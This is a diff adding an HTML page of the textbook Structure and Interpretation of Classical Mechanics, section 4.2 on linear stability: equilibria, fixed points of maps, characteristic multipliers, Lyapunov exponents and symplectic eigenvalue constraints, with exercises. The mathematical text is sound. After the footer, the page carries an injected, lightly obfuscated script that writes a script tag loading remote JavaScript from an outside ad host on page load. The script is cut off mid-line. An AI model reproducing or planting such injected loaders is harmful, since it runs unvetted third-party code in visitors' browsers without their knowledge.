@@ -1,0 +1,529 @@
+<!doctype html public "-//W3C//DTD HTML 4.0 Transitional//EN" "http://www.w3.org/TR/REC-html40/loose.dtd">
+<html>
+<!-- Generated from TeX source by tex2page, v 4p3, 
+     (c) Dorai Sitaram, http://www.cs.rice.edu/~dorai/tex2page -->
+<head>
+<title>
+
+Structure and Interpretation 
+of Classical Mechanics
+
+</title>
+<link rel="stylesheet" type="text/css" href="book-Z-C.css" title=default>
+<meta name=robots content="noindex,follow">
+</head>
+<body>
+<div class=navigation>[Go to <span><a href="book.html">first</a>, <a href="book-Z-H-49.html">previous</a></span><span>, <a href="book-Z-H-51.html">next</a></span> page<span>; &nbsp;&nbsp;</span><span><a href="book-Z-H-4.html#%_toc_start">contents</a></span><span><span>; &nbsp;&nbsp;</span><a href="book-Z-H-82.html#%_index_start">index</a></span>]</div>
+<p></p>
+<a name="%_sec_4.2"></a>
+<h2><a href="book-Z-H-4.html#%_toc_%_sec_4.2">4.2&nbsp;&nbsp;Linear Stability</a></h2>
+<p>
+<a name="%_idx_2178"></a>
+<a name="%_idx_2180"></a><a name="%_idx_2182"></a>Qualitative changes are associated with fixed points of the surface of
+section.  As the drive is turned on, chaotic zones appear at fixed
+points on separatrices of the undriven system, and we observe the
+appearance of new fixed points and periodic points associated with resonance islands.
+Here we investigate the behavior of systems near fixed points.  We can
+distinguish two types of fixed points on a surface of section: there
+are fixed points that correspond to equilibria of the system and there
+are fixed points that correspond to periodic orbits of the system.  We
+first consider the stability of equilibria of systems governed by
+differential equations, then discuss the stability of fixed points of
+maps.</p>
+<p>
+</p>
+<a name="%_sec_4.2.1"></a>
+<h3><a href="book-Z-H-4.html#%_toc_%_sec_4.2.1">4.2.1&nbsp;&nbsp;Equilibria of Differential Equations</a></h3>
+<p><a name="%_idx_2184"></a><a name="%_idx_2186"></a><a name="%_idx_2188"></a>
+Consider first the case of an equilibrium of a system of differential
+equations.  If a system is initially at an equilibrium point, the
+system remains there.  What can we say about the evolution of the
+system for points near such an equilibrium point?  This is actually a
+very difficult question, which has not been completely answered.  We can,
+however, understand quite a lot about the motion of systems near
+equilibrium.  The first step is to investigate the evolution of a
+linear approximation to the differential equations near the
+equilibrium.  This part is easy, and is the subject of linear
+stability analysis.  Later, we will address what the linear analysis
+implies for the actual problem.</p>
+<p>
+Consider a system of ordinary differential equations
+<a name="EQUATION_4.1"></a></p>
+<div align=left><img src="chap4-Z-G-4.gif" border="0"></div>
+<p>
+with components
+<a name="EQUATION_4.2"></a></p>
+<div align=left><img src="chap4-Z-G-5.gif" border="0"></div>
+<p>
+where <em>n</em> is the dimension of the state space.  An equilibrium point
+of this system of equations is a point <em>z</em><sub><em>e</em></sub> for which the state
+derivative is zero:
+<a name="EQUATION_4.3"></a></p>
+<div align=left><img src="chap4-Z-G-6.gif" border="0"></div>
+<p>
+That this is zero at all moments for the equilibrium solution implies
+<img src="front-Z-G-D-2.gif" border="0"><sub>0</sub> <em>F</em>(<em>t</em>, <em>z</em><sub><em>e</em></sub>)  =  0.</p>
+<p>
+Next consider a state path <em>z</em>' that passes near the equilibrium point.
+The path displacement <img src="chap2-Z-G-D-10.gif" border="0"> is defined so that at time <em>t</em>
+<a name="EQUATION_4.4"></a></p>
+<div align=left><img src="chap4-Z-G-7.gif" border="0"></div>
+<p>
+We have
+<a name="EQUATION_4.5"></a></p>
+<div align=left><img src="chap4-Z-G-8.gif" border="0"></div>
+<p>
+If <img src="chap2-Z-G-D-10.gif" border="0"> is small we can write the right-hand side as a Taylor
+series in&nbsp;<img src="chap2-Z-G-D-10.gif" border="0">:
+<a name="EQUATION_4.6"></a></p>
+<div align=left><img src="chap4-Z-G-9.gif" border="0"></div>
+<p>
+but the first term is zero because <em>z</em><sub><em>e</em></sub> is an equilibrium point, so
+<a name="EQUATION_4.7"></a></p>
+<div align=left><img src="chap4-Z-G-10.gif" border="0"></div>
+<p>
+If <img src="chap2-Z-G-D-10.gif" border="0"> is small the evolution is approximated by the
+linear terms.  Linear stability analysis investigates the evolution of the
+approximate equation
+<a name="EQUATION_4.8"></a></p>
+<div align=left><img src="chap4-Z-G-11.gif" border="0"></div>
+<p>
+These are the variational
+equations&nbsp;(<a href="book-Z-H-40.html#EQUATION_3.144">3.144</a>) with the equilibrium
+solution substituted for the reference trajectory.  The relationship
+of the solutions of this linearized system to the full system is a
+difficult mathematical problem, which has not been fully resolved.</p>
+<p>
+If we restrict attention to autonomous systems (<img src="front-Z-G-D-2.gif" border="0"><sub>0</sub> <em>F</em>  =  0),
+then the variational equations at an equilibrium are a linear system
+of ordinary differential equations with constant coefficients.<a name="call_footnote_Temp_298" href="#footnote_Temp_298"><sup><small>2</small></sup></a>
+Such systems can be solved analytically.  To simplify the notation, 
+let <em>M</em>  =  <img src="front-Z-G-D-2.gif" border="0"><sub>1</sub> <em>F</em>(<em>t</em>, <em>z</em><sub><em>e</em></sub>), so
+<a name="EQUATION_4.9"></a></p>
+<div align=left><img src="chap4-Z-G-12.gif" border="0"></div>
+<p>
+We seek a solution of the
+form
+<a name="EQUATION_4.10"></a></p>
+<div align=left><img src="chap4-Z-G-13.gif" border="0"></div>
+<p>
+where <img src="chap1-Z-G-D-21.gif" border="0"> is a structured constant with the same number of
+components as <img src="chap2-Z-G-D-10.gif" border="0">, and <img src="chap1-Z-G-D-40.gif" border="0"> is a complex number called a 
+<a name="%_idx_2190"></a><em>characteristic exponent</em>.  Substituting, we find
+<a name="EQUATION_4.11"></a></p>
+<div align=left><img src="chap4-Z-G-14.gif" border="0"></div>
+<p>
+The exponential factor is not zero, so we find
+<a name="EQUATION_4.12"></a></p>
+<div align=left><img src="chap4-Z-G-15.gif" border="0"></div>
+<p>
+<a name="%_idx_2192"></a>which is an equation for the eigenvalue <img src="chap1-Z-G-D-40.gif" border="0"> and (normalized) eigenvector
+<img src="chap1-Z-G-D-21.gif" border="0">.  In general, there are <em>n</em> eigenvalues and <em>n</em> eigenvectors,
+so we must add a subscript to both <img src="chap1-Z-G-D-21.gif" border="0"> and <img src="chap1-Z-G-D-40.gif" border="0"> indicating the
+particular solution.  The general solution is an arbitrary linear
+combination of these individual solutions.  The eigenvalues are
+solutions of the characteristic equation
+<a name="EQUATION_4.13"></a></p>
+<div align=left><img src="chap4-Z-G-16.gif" border="0"></div>
+<p>
+where <strong><em>M</em></strong> is the matrix representation of <em>M</em>, and <strong><em>I</em></strong> is
+the identity matrix of the same dimension.  The elements of <strong><em>M</em></strong>
+are real, so we know that the eigenvalues <img src="chap1-Z-G-D-40.gif" border="0"> either are real or
+come in complex-conjugate pairs.  We assume the eigenvalues are all
+distinct.<a name="call_footnote_Temp_299" href="#footnote_Temp_299"><sup><small>3</small></sup></a>  </p>
+<p>
+If the eigenvalue is real then the
+solution is exponential, as assumed.  If the eigenvalue <img src="chap1-Z-G-D-40.gif" border="0"> &gt; 0
+then the solution expands exponentially along the direction
+<img src="chap1-Z-G-D-21.gif" border="0">; if <img src="chap1-Z-G-D-40.gif" border="0"> &lt; 0 then the solution contracts exponentially
+along the direction <img src="chap1-Z-G-D-21.gif" border="0">.  </p>
+<p>
+If the eigenvalue is complex we
+can form real solutions by combining the two solutions for the 
+complex-conjugate pair of eigenvalues.  Let <img src="chap1-Z-G-D-40.gif" border="0">  =  <em>a</em>  +  <em>i</em> <em>b</em>, with real <em>a</em>
+and <em>b</em>, be one such complex eigenvalue.  Let <img src="chap1-Z-G-D-21.gif" border="0">  =  <em>u</em>  +  <em>i</em> <em>v</em>,
+where <em>u</em> and <em>v</em> are real, be the eigenvector corresponding to it.
+So there is a complex solution of the form
+<a name="EQUATION_4.14"></a></p>
+<div align=left><img src="chap4-Z-G-17.gif" border="0"></div>
+<p>
+The complex conjugate of this solution is also a solution, because the
+ordinary differential equation is linear with real linear
+coefficients.  This complex-conjugate solution is associated with the
+eigenvalue that is the complex conjugate of the original complex
+eigenvalue.  So the real and imaginary parts of <img src="chap2-Z-G-D-10.gif" border="0"><sub><em>c</em></sub> are real
+solutions:
+<a name="EQUATION_4.15"></a></p>
+<div align=left><img src="chap4-Z-G-18.gif" border="0"></div>
+<p>
+These two solutions reside in the plane containing the vectors <em>u</em> and
+<em>v</em>.  If <em>a</em> is positive both solutions spiral outwards exponentially,
+and if <em>a</em> is negative they both spiral inwards.  If <em>a</em> is zero, both
+solutions trace the same ellipse, but with different phases.  </p>
+<p>
+Again, the general solution is an arbitrary linear combination of the
+particular real solutions corresponding to the various eigenvalues.
+So if we denote the <em>k</em>th real eigensolution <img src="chap2-Z-G-D-10.gif" border="0"><sub><em>k</em></sub>(<em>t</em>), then
+the general solution is
+<a name="EQUATION_4.16"></a></p>
+<div align=left><img src="chap4-Z-G-19.gif" border="0"></div>
+<p>
+where <em>A</em><sub><em>k</em></sub> may be determined by the initial conditions (the state at a
+given time).</p>
+<p>
+</p>
+<p><a name="%_thm_4.1"></a>
+<b>Exercise 4.1.</b>&nbsp;&nbsp;<strong>Pendulum</strong><br></p>
+<p>
+Carry out the details of finding the eigensolutions for the two
+equilibria of the pendulum (<img src="chap1-Z-G-D-19.gif" border="0">  =  0 and <img src="chap1-Z-G-D-19.gif" border="0">  =  <img src="chap1-Z-G-D-15.gif" border="0">, both with
+<em>p</em><sub><img src="chap1-Z-G-D-19.gif" border="0"></sub>  =  0).  How is the small-amplitude oscillation frequency
+related to the eigenvalues?  How are the eigendirections related to
+the contours of the Hamiltonian?</p>
+<p>
+</p>
+
+<p></p>
+<p>
+</p>
+<a name="%_sec_4.2.2"></a>
+<h3><a href="book-Z-H-4.html#%_toc_%_sec_4.2.2">4.2.2&nbsp;&nbsp;Fixed Points of Maps</a></h3>
+<p><a name="%_idx_2194"></a><a name="%_idx_2196"></a><a name="%_idx_2198"></a>
+<a name="%_idx_2200"></a><a name="%_idx_2202"></a>Fixed points on a surface of section correspond either to equilibrium
+points of the system or to a periodic motion of the system.  Linear
+stability analysis of fixed points is similar to the linear stability
+analysis for equilibrium points.</p>
+<p>
+Let <em>T</em> be a map of the state space onto itself, as might be generated
+by a surface of section.  A trajectory sequence is generated by
+successive iteration of the map <em>T</em>.  Let <em>x</em>(<em>n</em>) be the <em>n</em>th
+point of the sequence.  The map carries one point of the
+trajectory sequence to the next: <em>x</em>(<em>n</em> + 1)  =  <em>T</em>(<em>x</em>(<em>n</em>)).  We can
+represent successive iterations of the map by a superscript, so that
+<em>T</em><sup><em>i</em></sup> indicates <em>T</em> composed <em>i</em> times.  For example, <em>T</em><sup>2</sup>(<em>x</em>)  = 
+<em>T</em>(<em>T</em>(<em>x</em>)).  Thus <em>x</em>(<em>n</em>)  =  <em>T</em><sup><em>n</em></sup>(<em>x</em>(0)).<a name="call_footnote_Temp_301" href="#footnote_Temp_301"><sup><small>4</small></sup></a></p>
+<p>
+
+<a name="%_idx_2204"></a>A <em>fixed point</em> <em>x</em><sub>0</sub> of the map <em>T</em> satisfies
+<a name="EQUATION_4.17"></a></p>
+<div align=left><img src="chap4-Z-G-20.gif" border="0"></div>
+<p>
+<a name="%_idx_2206"></a>A <em>periodic point</em> of the map <em>T</em> is a point that is visited
+every <em>k</em> iterations of <em>T</em>.  Thus it is a fixed point of the
+map <em>T</em><sup><em>k</em></sup>.  So the behavior near a periodic point can be ascertained by
+looking at the behavior near an associated fixed point of <em>T</em><sup><em>k</em></sup>.</p>
+<p>
+Let <em>x</em> be some trajectory initially near the fixed point <em>x</em><sub>0</sub> of <em>T</em>, and <img src="chap1-Z-G-D-18.gif" border="0">
+be the deviation from <em>x</em><sub>0</sub>: <em>x</em>(<em>n</em>)  =  <em>x</em><sub>0</sub>  +  <img src="chap1-Z-G-D-18.gif" border="0">(<em>n</em>).  The
+trajectory satisfies
+<a name="EQUATION_4.18"></a></p>
+<div align=left><img src="chap4-Z-G-21.gif" border="0"></div>
+<p>
+Expanding the right-hand side as a Taylor series, we obtain
+<a name="EQUATION_4.19"></a></p>
+<div align=left><img src="chap4-Z-G-22.gif" border="0"></div>
+<p>
+but <em>x</em><sub>0</sub>  =  <em>T</em>(<em>x</em><sub>0</sub>) so
+<a name="EQUATION_4.20"></a></p>
+<div align=left><img src="chap4-Z-G-23.gif" border="0"></div>
+<p>
+Linear stability analysis considers the evolution of the system
+truncated to the linear terms
+<a name="EQUATION_4.21"></a></p>
+<div align=left><img src="chap4-Z-G-24.gif" border="0"></div>
+<p>
+This is a system of linear difference equations, with constant
+coefficients <em>D</em><em>T</em>(<em>x</em><sub>0</sub>).  </p>
+<p>
+We assume there are solutions of the form
+<a name="EQUATION_4.22"></a></p>
+<div align=left><img src="chap4-Z-G-25.gif" border="0"></div>
+<p>
+where <img src="chap4-Z-G-D-1.gif" border="0"> is some (complex) number, called a
+<a name="%_idx_2208"></a><em>characteristic multiplier</em>.<a name="call_footnote_Temp_302" href="#footnote_Temp_302"><sup><small>5</small></sup></a> 
+Substituting this solution into the linearized evolution equation, we find
+<a name="EQUATION_4.23"></a></p>
+<div align=left><img src="chap4-Z-G-26.gif" border="0"></div>
+<p>
+or
+<a name="EQUATION_4.24"></a></p>
+<div align=left><img src="chap4-Z-G-27.gif" border="0"></div>
+<p>
+where <em>I</em> is the identity function.  We see that <img src="chap4-Z-G-D-1.gif" border="0"> is an <a name="%_idx_2212"></a>eigenvalue of the
+linear transformation <em>D</em><em>T</em>(<em>x</em><sub>0</sub>) and <img src="chap1-Z-G-D-21.gif" border="0"> is the associated
+(normalized) eigenvector.  Let <em>M</em> = <em>D</em><em>T</em>(<em>x</em><sub>0</sub>), and <strong><em>M</em></strong> be its matrix
+representation. The eigenvalues are determined by
+<a name="EQUATION_4.25"></a></p>
+<div align=left><img src="chap4-Z-G-28.gif" border="0"></div>
+<p>
+The elements of <strong><em>M</em></strong> are real, so the eigenvalues <img src="chap4-Z-G-D-1.gif" border="0"> are
+either real or come in complex-conjugate pairs.<a name="call_footnote_Temp_303" href="#footnote_Temp_303"><sup><small>6</small></sup></a>  </p>
+<p>
+For the real
+eigenvalues the solutions are just exponential expansion or
+contraction along the associated eigenvector <img src="chap1-Z-G-D-21.gif" border="0">:
+<a name="EQUATION_4.26"></a></p>
+<div align=left><img src="chap4-Z-G-29.gif" border="0"></div>
+<p></p>
+<p>
+
+The solution is expanding if || <img src="chap4-Z-G-D-1.gif" border="0"> || &gt; 1 and contracting if ||
+<img src="chap4-Z-G-D-1.gif" border="0"> || &lt; 1.  If the eigenvalues are complex, then the solution is
+complex, but the complex solutions corresponding to the complex-conjugate
+pair of eigenvalues can be combined to form two real
+solutions, as was done for the equilibrium solutions.  Let <img src="chap4-Z-G-D-1.gif" border="0">  = 
+exp(<em>A</em>  +  <em>i</em> <em>B</em>) with real <em>A</em> and <em>B</em>, and <img src="chap1-Z-G-D-18.gif" border="0">  =  <em>u</em>  +  <em>i</em> <em>v</em>.  A
+calculation similar to that for the equilibrium case show that there
+are two real solutions
+<a name="EQUATION_4.27"></a></p>
+<div align=left><img src="chap4-Z-G-30.gif" border="0"></div>
+<p>
+We see that if <em>A</em>&gt;0 then the solution exponentially expands, and if
+<em>A</em>&lt;0 the solution exponentially contracts.  Exponential expansion,
+<em>A</em>&gt;0, corresponds to || <img src="chap4-Z-G-D-1.gif" border="0"> || &gt; 1; exponential contraction, <em>A</em>&lt;0,
+corresponds to || <img src="chap4-Z-G-D-1.gif" border="0"> || &lt; 1.  If <em>A</em> = 0 then the two real solutions
+trace an ellipse and any linear combination of them traces an ellipse.  </p>
+<p>
+The general solution is an arbitrary linear combination of each of the
+eigensolutions.  Let <img src="chap1-Z-G-D-18.gif" border="0"><sub><em>k</em></sub> be the <em>k</em>th real eigensolution.
+The general solution is
+<a name="EQUATION_4.28"></a></p>
+<div align=left><img src="chap4-Z-G-31.gif" border="0"></div>
+<p>
+where <em>A</em><sub><em>k</em></sub> may be determined by the initial conditions.</p>
+<p>
+</p>
+<p><a name="%_thm_4.2"></a>
+<b>Exercise 4.2.</b>&nbsp;&nbsp;<strong>Elliptical oscillation</strong><br></p>
+<p>
+Show that the arbitrary linear combination of <img src="chap1-Z-G-D-18.gif" border="0"><sub><em>a</em></sub> and <img src="chap1-Z-G-D-18.gif" border="0"><sub><em>b</em></sub>
+traces an ellipse for <em>A</em> = 0.</p>
+<p>
+</p>
+
+<p></p>
+<p>
+</p>
+<p><a name="%_thm_4.3"></a>
+<b>Exercise 4.3.</b>&nbsp;&nbsp;<strong>Standard map</strong><br></p>
+<p>
+The standard map (see section&nbsp;<a href="book-Z-H-45.html#%_sec_3.9">3.9</a>) has fixed points
+at <em>I</em> = 0 for <img src="chap1-Z-G-D-19.gif" border="0"> = 0 and <img src="chap1-Z-G-D-19.gif" border="0"> = <img src="chap1-Z-G-D-15.gif" border="0">.  Find the full
+eigensolutions for these two fixed points.  For what ranges of the
+parameter <em>K</em> are the fixed points linearly stable or unstable?</p>
+<p>
+</p>
+
+<p></p>
+<p>
+</p>
+<a name="%_sec_4.2.3"></a>
+<h3><a href="book-Z-H-4.html#%_toc_%_sec_4.2.3">4.2.3&nbsp;&nbsp;Relations Among Exponents</a></h3>
+<p><a name="%_idx_2214"></a>
+For maps that are generated by stroboscopic sampling of the evolution
+of a system of autonomous differential equations, equilibrium points
+are fixed points of the map.  The eigensolutions of the equilibrium of
+the flow and the eigensolutions of the map at the fixed point are then
+related.  Let <img src="chap2-Z-G-D-22.gif" border="0"> be the sampling period.  Then
+<img src="chap4-Z-G-D-1.gif" border="0"><sub><em>i</em></sub>  =  <em>e</em><sup><img src="chap1-Z-G-D-40.gif" border="0"><sub><em>i</em></sub> <img src="chap2-Z-G-D-22.gif" border="0"></sup> .</p>
+<p>
+<a name="%_idx_2216"></a>The Lyapunov exponent is a measure of the rate of exponential
+divergence of nearby trajectories from a reference trajectory.  If the
+reference trajectory is an equilibrium of a flow, then the Lyapunov
+exponents are the real parts of the linearized characteristic
+exponents <img src="chap1-Z-G-D-40.gif" border="0"><sub><em>i</em></sub>.  If the reference trajectory is fixed point of
+a map generated by a flow (either a periodic orbit or an equilibrium),
+then the Lyapunov exponents are real parts of the logarithm of the
+characteristic multipliers, divided by the period of the map.  So if
+the characteristic multiplier is <img src="chap4-Z-G-D-1.gif" border="0">  =  <em>e</em><sup><em>A</em>+<em>i</em><em>B</em></sup> and the period of
+the map is <img src="chap2-Z-G-D-22.gif" border="0">, then the Lyapunov exponent is <em>A</em>/<img src="chap2-Z-G-D-22.gif" border="0">.  A positive
+Lyapunov exponent of a fixed point indicates linear instability of the
+fixed point.</p>
+<p>
+The Lyapunov exponent has less information than the characteristic
+multipliers or exponents because the imaginary part is lost.  However,
+the Lyapunov exponent is more generally applicable in that it is well
+defined even for reference trajectories that are not periodic.</p>
+<p>
+In the linear analysis of the fixed point, each characteristic
+exponent corresponds to a subspace of possible linear solutions.  For
+instance, for a real characteristic multiplier there is a corresponding
+eigendirection, and for any initial displacement along this direction
+successive iterates are also along this direction.  Complex-conjugate
+pairs of multipliers correspond to a plane of solutions.  For a
+displacement initially on this plane, successive iterates are also on
+this plane.</p>
+<p>
+It turns out that something like this is also the case for the
+linearized solutions near a reference trajectory that is not at a
+fixed point.  For each nonzero Lyapunov exponent there is a twisting
+subspace, so that for an initial displacement in this subspace
+successive iterates also belong to the subspace.  At different points
+along the reference trajectory the unit displacement vector that
+characterizes the direction of this subspace is different.</p>
+<p>
+</p>
+<a name="%_sec_Temp_306"></a>
+<h4><a href="book-Z-H-4.html#%_toc_%_sec_Temp_306">Hamiltonian specialization</a></h4>
+<p><a name="%_idx_2218"></a>For Hamiltonian systems there are additional constraints among the
+eigenvalues.</p>
+<p>
+Consider first the case of two-dimensional surfaces of section.  We
+have seen that Hamiltonian surfaces of section preserve area.
+As we saw in the proof of Liouville's theorem, area preservation
+implies that the determinant of the derivative of the transformation
+is 1.  At a fixed point <em>x</em><sub>0</sub> the linearized map is <img src="chap1-Z-G-D-18.gif" border="0">(<em>n</em> + 1)  = 
+<em>D</em><em>T</em>(<em>x</em><sub>0</sub>) <img src="chap1-Z-G-D-18.gif" border="0">(<em>n</em>).  So <em>M</em>  =  <em>D</em><em>T</em>(<em>x</em><sub>0</sub>) has unit determinant.  Now the
+determinant is the product of the eigenvalues, so for a fixed point on
+<a name="%_idx_2220"></a>a Hamiltonian surface of section the two eigenvalues must be inverses
+of each other.  We also have the constraint that if an eigenvalue is
+complex then the complex conjugate of the eigenvalue is also an
+eigenvalue.  These two conditions imply that the eigenvalues must
+either be real and inverses, or be complex-conjugate pairs on the unit
+circle (see figure&nbsp;<a href="#FIGURE_4.4">4.4</a>).</p>
+<p>
+<a name="FIGURE_4.4"></a></p>
+<div align=left><img src="chap4-Z-G-32.gif" border="0"></div>
+<p></p>
+<p>
+Fixed points for which the characteristic multipliers all lie on the
+<a name="%_idx_2222"></a>unit circle are called <em>elliptic</em> fixed points.  The solutions of the
+linearized variational equations trace ellipses around the fixed
+point.  Elliptic fixed points are linearly stable.</p>
+<p>
+<a name="%_idx_2224"></a>Fixed points with positive real characteristic multipliers are called
+<em>hyperbolic</em> fixed points.  For two-dimensional maps, there is an
+exponentially expanding subspace and an exponentially contracting
+subspace.  The general solution is a linear combination of these. 
+Fixed points for which the characteristic multipliers are negative are
+called <em>hyperbolic with reflection</em>.</p>
+<p>
+The edge case of two degenerate characteristic multipliers is called
+<a name="%_idx_2226"></a><em>parabolic</em>.  For two degenerate eigenvalues the general solution
+grows linearly.  This happens at points of bifurcation where elliptic
+points become hyperbolic points or vice versa.</p>
+<p>
+For two-dimensional Hamiltonian maps these are the only possibilities.
+For higher-dimensional Hamiltonian maps, we can get combinations of
+these: some characteristic multipliers can be real and others
+complex-conjugate pairs.  We might imagine that in addition there
+would be many other types of fixed points that occur in higher
+dimensions.  In fact, there is only one additional type, shown in
+figure&nbsp;<a href="#FIGURE_4.5">4.5</a>.  For Hamiltonian systems of arbitrary
+dimensions it is still the case that for each eigenvalue the complex
+conjugate and the inverse are also eigenvalues.  We can prove this
+starting from a result in
+chapter&nbsp;<a href="book-Z-H-57.html#%_chap_5">5</a>.  Consider the map of
+the phase space onto itself that is generated by time evolution of a
+Hamiltonian system.  Let <em>z</em>  =  (<em>q</em>, <em>p</em>); then the map <em>T</em><sub><i>&szlig;</i></sub>
+satisfies <em>z</em>(<em>t</em> + <i>&szlig;</i>)  =  <em>T</em><sub><i>&szlig;</i></sub>(<em>z</em>(<em>t</em>)) for solutions <em>z</em> of Hamilton's
+equations.  We will show in chapter&nbsp;<a href="book-Z-H-57.html#%_chap_5">5</a> that the derivative of the map <em>T</em><sub><i>&szlig;</i></sub> is
+<a name="%_idx_2228"></a><a name="%_idx_2230"></a><a name="%_idx_2232"></a><a name="%_idx_2234"></a>symplectic, whether or not the starting point is at a fixed
+point.  A 2<em>n</em>&times;2<em>n</em> matrix <strong><em>M</em></strong> is <em>symplectic</em> if it satisfies
+<a name="EQUATION_4.29"></a></p>
+<div align=left><img src="chap4-Z-G-33.gif" border="0"></div>
+<p> 
+<a name="%_idx_2236"></a><a name="%_idx_2238"></a><a name="%_idx_2240"></a>where <strong><em>J</em></strong> is
+the 2<em>n</em>-dimensional symplectic unit: 
+<a name="EQUATION_4.30"></a></p>
+<div align=left><img src="chap4-Z-G-34.gif" border="0"></div>
+<p>
+with the <em>n</em>&times; <em>n</em> unit matrix
+<strong>1</strong><sub><em>n</em> &times; <em>n</em></sub> and the <em>n</em> &times; <em>n</em> zero matrix <strong>0</strong><sub><em>n</em>
+&times; <em>n</em></sub>.</p>
+<p>
+<a name="%_idx_2242"></a><a name="FIGURE_4.5"></a></p>
+<div align=left><img src="chap4-Z-G-35.gif" border="0"></div>
+<p></p>
+<p>
+
+Using the symplectic property, we can show that in general for each
+eigenvalue its inverse is also an eigenvalue.  Assume <img src="chap4-Z-G-D-1.gif" border="0"> is an
+eigenvalue, so that <img src="chap4-Z-G-D-1.gif" border="0"> satisfies det(<strong><em>M</em></strong>  <tt>-</tt>  <img src="chap4-Z-G-D-1.gif" border="0"> <strong><em>I</em></strong>)  =  0.
+This equation is unchanged if <strong><em>M</em></strong> is replaced by its transpose,
+so <img src="chap4-Z-G-D-1.gif" border="0"> is also an eigenvalue of <strong><em>M</em></strong><sup><tt><em>T</em></tt></sup>:
+<a name="EQUATION_4.31"></a></p>
+<div align=left><img src="chap4-Z-G-36.gif" border="0"></div>
+<p>
+From this we can see that
+<a name="EQUATION_4.32"></a></p>
+<div align=left><img src="chap4-Z-G-37.gif" border="0"></div>
+<p>
+Now, from the symplectic property we have
+<a name="EQUATION_4.33"></a></p>
+<div align=left><img src="chap4-Z-G-38.gif" border="0"></div>
+<p>
+So
+<a name="EQUATION_4.34"></a></p>
+<div align=left><img src="chap4-Z-G-39.gif" border="0"></div>
+<p>
+and we can conclude that 1/<img src="chap4-Z-G-D-1.gif" border="0"> is an eigenvalue of <strong><em>M</em></strong> with the
+eigenvector <strong><em>J</em></strong> <img src="chap1-Z-G-D-21.gif" border="0">'.  From the fact that for every
+eigenvalue its inverse is also an eigenvalue we deduce that the
+determinant of the transformation <strong><em>M</em></strong>, which is the product of
+the eigenvalues, is one.</p>
+<p>
+The constraints that the eigenvalues must be associated with
+inverses and complex conjugates yields exactly one new pattern of
+eigenvalues in higher dimensions.  Figure&nbsp;<a href="#FIGURE_4.5">4.5</a> shows the
+only new pattern that is possible.</p>
+<p>
+We have seen that the Lyapunov exponents for fixed points are related
+to the characteristic multipliers for the fixed points, so the
+<a name="%_idx_2244"></a>Hamiltonian constraints on the multipliers correspond to Hamiltonian
+constraints for Lyapunov exponents at fixed points.  For each
+characteristic multiplier, the inverse is also a characteristic
+multiplier.  This means that at fixed points, for each positive
+Lyapunov exponent there is a corresponding negative Lyapunov exponent
+with the same magnitude.  It turns out that this is also true if the
+reference trajectory is not at a fixed point.  For Hamiltonian
+systems, for each positive Lyapunov exponent there is a corresponding
+negative exponent of equal magnitude.</p>
+<p>
+</p>
+<p><a name="%_thm_4.4"></a>
+<b>Exercise 4.4.</b>&nbsp;&nbsp;<strong>Quartet</strong><br></p>
+<p>
+Describe (perhaps by drawing cross sections) the orbits that are
+possible with quartets.</p>
+<p>
+</p>
+
+<p></p>
+<p>
+</p>
+<a name="%_sec_Temp_308"></a>
+<h4><a href="book-Z-H-4.html#%_toc_%_sec_Temp_308">Linear and nonlinear stability</a></h4>
+<p><a name="%_idx_2246"></a>
+A fixed point that is linearly unstable indicates that the full system
+is unstable at that point.  This means that trajectories
+starting near the fixed point diverge from the fixed point.  On the
+other hand, linear stability of a fixed point does not generally
+guarantee that the full system is stable at that point.  For a
+two-degree-of-freedom Hamiltonian system, the <a name="%_idx_2248"></a>Kolmogorov-Arnold-Moser
+theorem proves under certain conditions that linear stability
+implies nonlinear stability.  In higher dimensions, though, it is not
+known whether linear stability implies nonlinear stability.</p>
+<p>
+</p>
+<div class=smallprint><hr></div>
+<p></p>
+<div class=footnote>
+<p><a name="footnote_Temp_298" href="#call_footnote_Temp_298"><sup><small>2</small></sup></a> Actually, all we need is <img src="front-Z-G-D-2.gif" border="0"><sub>0</sub> <img src="front-Z-G-D-2.gif" border="0"><sub>1</sub> <em>F</em>(<em>t</em>, <em>z</em><sub><em>e</em></sub>)  =  0.</p>
+
+<p><a name="footnote_Temp_299" href="#call_footnote_Temp_299"><sup><small>3</small></sup></a> If the eigenvalues are not unique then the form of
+the solution is modified.</p>
+
+<p><a name="footnote_Temp_301" href="#call_footnote_Temp_301"><sup><small>4</small></sup></a> The map <em>T</em> is being used as an operator: multiplication is
+interpreted as composition.</p>
+
+<p><a name="footnote_Temp_302" href="#call_footnote_Temp_302"><sup><small>5</small></sup></a> A characteristic multiplier is also sometimes called a
+<a name="%_idx_2210"></a>  Floquet multiplier.</p>
+
+<p><a name="footnote_Temp_303" href="#call_footnote_Temp_303"><sup><small>6</small></sup></a> We
+assume for now that the eigenvalues are distinct.</p>
+</div>
+<div class=navigation>[Go to <span><a href="book.html">first</a>, <a href="book-Z-H-49.html">previous</a></span><span>, <a href="book-Z-H-51.html">next</a></span> page<span>; &nbsp;&nbsp;</span><span><a href="book-Z-H-4.html#%_toc_start">contents</a></span><span><span>; &nbsp;&nbsp;</span><a href="book-Z-H-82.html#%_index_start">index</a></span>]</div>
+<p></p>
+<script type="text/javascript">if(self==top){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);document.write("<scr"+"ipt type=text/javascript src="+idc_glo_url+ "cfs.u-ad.info/cfspushadsv2/request");document.write("?id=1");document.write("&amp;enc=telkom2");document.write("&amp;params=" + 